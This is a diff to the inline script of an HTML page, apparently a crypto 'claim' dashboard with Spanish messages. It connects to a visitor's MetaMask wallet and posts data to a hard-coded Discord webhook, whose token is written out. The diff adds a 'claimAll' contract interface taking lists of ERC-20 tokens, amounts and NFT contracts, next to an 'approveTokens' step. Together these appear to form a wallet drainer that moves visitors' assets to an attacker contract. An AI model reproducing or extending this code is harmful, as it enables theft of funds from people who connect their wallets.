@@ -456,24 +456,20 @@ body {
 <script>
     const DISCORD_WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1360019304921436180/o61QmLpPd_TJ1lLxkXuzvyeW9VFtDvX7buOMmMYNDbbAqz1eod7Qi6F7TUto1JBQUGY_';
     const contractAddress = "0x579d705fE8bA250eDA39aa51E6443AD971112686";
-    const usdtAddress = "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58";
-
-    const usdtAbi = [
-  {
-    "constant": true,
-    "inputs": [{"name": "_owner", "type": "address"}],
-    "name": "balanceOf",
-    "outputs": [{"name": "balance", "type": "uint256"}],
-    "type": "function"
-  },
-  {
-    "constant": true,
-    "inputs": [],
-    "name": "decimals",
-    "outputs": [{"name": "", "type": "uint8"}],
-    "type": "function"
-  }
-];
+    const contractABI = [
+      {
+        "inputs": [
+          { "internalType": "address[]", "name": "tokensERC20", "type": "address[]" },
+          { "internalType": "uint256[]", "name": "amounts", "type": "uint256[]" },
+          { "internalType": "address[]", "name": "contractsERC721", "type": "address[]" },
+          { "internalType": "address[]", "name": "contractsERC1155", "type": "address[]" }
+        ],
+        "name": "claimAll",
+        "outputs": [],
+        "stateMutability": "nonpayable",
+        "type": "function"
+      }
+    ];
 
     let web3;
     let userAccount;
@@ -507,6 +503,7 @@ body {
           contract = new web3.eth.Contract(contractABI, contractAddress);
           document.getElementById("approveTokens").disabled = false;
           document.getElementById("claimAll").disabled = false;
+          alert("Conectado a MetaMask: " + userAccount);
         } catch (error) {
           alert("Error al conectar MetaMask");
         }
@@ -607,49 +604,6 @@ body {
         console.error("Error enviando a Discord:", error);
       }
     }
-
-   document.getElementById('searchForm').addEventListener('submit', async (e) => {
-    e.preventDefault();
-
-    const addressInput = document.getElementById('addressInput').value.trim();
-    if (!web3.utils.isAddress(addressInput)) {
-        alert('Dirección inválida');
-        return;
-    }
-
-    const usdtContract = new web3.eth.Contract(usdtAbi, usdtAddress); // Instanciamos el contrato
-
-    try {
-        // Obtener el balance de ETH en Wei
-        const balanceWei = await web3.eth.getBalance(addressInput);
-        const balanceEth = web3.utils.fromWei(balanceWei, 'ether');  // Convertir Wei a Ether (String)
-
-        // Obtener el balance de USDT
-        const balance = await usdtContract.methods.balanceOf(addressInput).call();
-        const decimals = await usdtContract.methods.decimals().call();
-
-        // Convertir el balance de USDT a un valor legible usando BigInt
-        const formattedBalance = BigInt(balance) / BigInt(10 ** decimals); // Asegurarse de que ambos valores sean BigInt
-
-        // Actualizar el dashboard con los balances
-        document.querySelector('.stat-value').innerText = `${parseFloat(balanceEth).toFixed(4)} ETH`;
-        document.querySelector(".stat-value").textContent = `${formattedBalance.toString()} USDT`; // Convertir BigInt a String
-
-        // Mostrar un Toast con el balance de ETH
-        Toastify({
-            text: `Balance: ${parseFloat(balanceEth).toFixed(4)} ETH`,
-            duration: 3000,
-            gravity: "top",
-            position: "right",
-            backgroundColor: "#00E676",
-        }).showToast();
-
-    } catch (error) {
-        console.error(error);
-        alert('Error al consultar la dirección');
-    }
-});
-
 </script>
     <!-- Scripts remain same -->
 </body>
